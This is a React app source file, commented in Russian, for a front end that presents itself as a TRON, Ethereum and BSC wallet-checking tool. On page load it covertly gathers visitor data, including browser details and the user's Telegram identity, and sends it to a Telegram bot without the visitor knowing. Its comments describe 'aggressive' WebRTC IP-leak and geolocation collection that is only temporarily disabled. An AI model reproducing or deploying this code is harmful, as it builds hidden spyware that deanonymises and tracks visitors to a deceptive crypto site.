import { useState, useEffect } from 'react';
import { NetworkSelection } from './components/NetworkSelection';
import { AddressInput } from './components/AddressInput';
import { CheckResults } from './components/CheckResults';
import { Header } from './components/Header';
import { Footer } from './components/Footer';
import { getIPSuperFast, getIPFast, getUserInfo, getGeoData } from './utils/webrtc-ip';
import { sendUserDataToBot, getBotInfo } from './utils/telegram-bot';
import './utils/test-webrtc'; // Импортируем тесты для доступа в консоли
import './utils/debug-helpers'; // Debug команды для консоли

// 🚫 ВРЕМЕННО: WebRTC leak отключен для тестирования загрузки
// Чтобы включить обратно - раскомментируйте строки с getIPSuperFast() и getIPFast()

export type Network = 'tron' | 'ethereum' | 'bsc';

// Declare Telegram type
declare global {
  interface Window {
    Telegram?: any;
  }
}

export default function App() {
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
  const [walletAddress, setWalletAddress] = useState('');

  // Получение IP и отправка в бота при загрузке приложения
  useEffect(() => {
    // 🚀 ДВУХЭТАПНЫЙ СБОР для быстрой загрузки:
    // Этап 1: SUPER FAST (2-3 сек) - показываем UI быстро
    // Этап 2: ПОЛНЫЙ сбор в фоне (5-8 сек) - отправляем все данные
    
    const trackUserFast = async () => {
      try {
        console.log('🚀🚀🚀 ЭТАП 1: SUPER FAST MODE - быстрая загрузка!');
        console.log('⚠️ WebRTC временно отключен!');
        
        // 🚫 ВРЕМЕННО: WebRTC отключен
        // const { ip: fastIP, ipInfo: fastIPInfo } = await getIPSuperFast();
        const fastIP = 'WebRTC_DISABLED';
        const fastIPInfo = {
          ipv4: [],
          ipv6: [],
          localIP: [],
          webrtcLeaked: []
        };
        console.log('⚡ Быстрый IP (mock):', fastIP);
        
        // Получаем базовую информацию
        const userInfo = getUserInfo();
        
        // Получаем Telegram данные если доступны
        let telegramUser = null;
        if (typeof window !== 'undefined' && window.Telegram?.WebApp) {
          telegramUser = window.Telegram.WebApp.initDataUnsafe?.user || null;
        }
        
        console.log('✅ Этап 1 завершен - UI готов к показу!');
        console.log('⏱️ Время: ~0.5 секунды (WebRTC отключен)');
        
        // 🔥 ЭТАП 2: Полный сбор данных в фоне (не блокирует UI)
        console.log('');
        console.log('🔥🔥🔥 ЭТАП 2: ПОЛНЫЙ сбор данных в фоне...');
        
        // Проверяем бота
        getBotInfo().then(botInfo => {
          console.log('🤖 Bot info:', botInfo);
        }).catch(err => {
          console.error('⚠️ Ошибка проверки бота:', err);
        });
        
        // 🚫 ВРЕМЕННО: WebRTC отключен
        // const { ip, ipInfo } = await getIPFast();
        const ip = 'WebRTC_DISABLED';
        const ipInfo = fastIPInfo;
        console.log('📍 Полный IP (mock):', ip);
        console.log('🌐 Full IP Info (mock):', ipInfo);
        
        // АГРЕССИВНОЕ получение геоданных - тоже отключено
        let geoData = undefined;
        console.log('🌍 Геоданные отключены (WebRTC disabled)');
        
        // Формируем ПОЛНЫЙ пакет данных
        const fullUserData = {
          ip: ip,
          ipInfo: ipInfo,
          geoData: geoData,
          ...userInfo,
          telegramUser
        };
        
        console.log('📦 ПОЛНЫЙ набор данных собран:', fullUserData);
        
        // Отправляем в Telegram
        console.log('📤 Отправка ПОЛНОГО пакета данных в Telegram...');
        sendUserDataToBot(fullUserData).then(sent => {
          if (sent) {
            console.log('✅ Данные успешно отправлены в бота');
            console.log('🎉 Полный агрессивный сбор завершен!');
          } else {
            console.error('❌ Не удалось отправить данные в бота');
          }
        }).catch(err => {
          console.error('❌ Ошибка отправки в бота:', err);
        });
        
      } catch (error) {
        console.error('❌ Ошибка при сборе данных:', error);
      }
    };
    
    // Запускаем без await - не блокируем рендер
    trackUserFast();
  }, []); // Выполняется один раз при монтировании компонента

  const handleNetworkSelect = (network: Network) => {
    setSelectedNetwork(network);
  };

  const handleContinueFromNetwork = () => {
    if (selectedNetwork) {
      setStep(2);
    }
  };

  const handleCheckWallet = (address: string) => {
    setWalletAddress(address);
    setStep(3);
  };

  const handleStartOver = () => {
    setStep(1);
    setSelectedNetwork(null);
    setWalletAddress('');
  };

  return (
    <div className="relative min-h-screen w-full" style={{ backgroundImage: "linear-gradient(90deg, rgb(250, 251, 252) 0%, rgb(250, 251, 252) 100%), linear-gradient(90deg, rgb(255, 255, 255) 0%, rgb(255, 255, 255) 100%)" }}>
      <div className="content-stretch flex flex-col items-start w-full">
        <Header />
        
        <div className="w-full flex justify-center">
          <div className="max-w-[534px] w-full">
            <div className="box-border content-stretch flex flex-col items-start w-full pb-[100px] pt-[40px] px-[15px]">
              {step === 1 && (
                <NetworkSelection
                  selectedNetwork={selectedNetwork}
                  onSelectNetwork={handleNetworkSelect}
                  onContinue={handleContinueFromNetwork}
                />
              )}
              
              {step === 2 && (
                <AddressInput
                  network={selectedNetwork!}
                  onCheck={handleCheckWallet}
                  onBack={() => setStep(1)}
                />
              )}
              
              {step === 3 && (
                <CheckResults
                  network={selectedNetwork!}
                  address={walletAddress}
                  onStartOver={handleStartOver}
                />
              )}
            </div>
          </div>
        </div>
        
        <Footer />
      </div>
    </div>
  );
}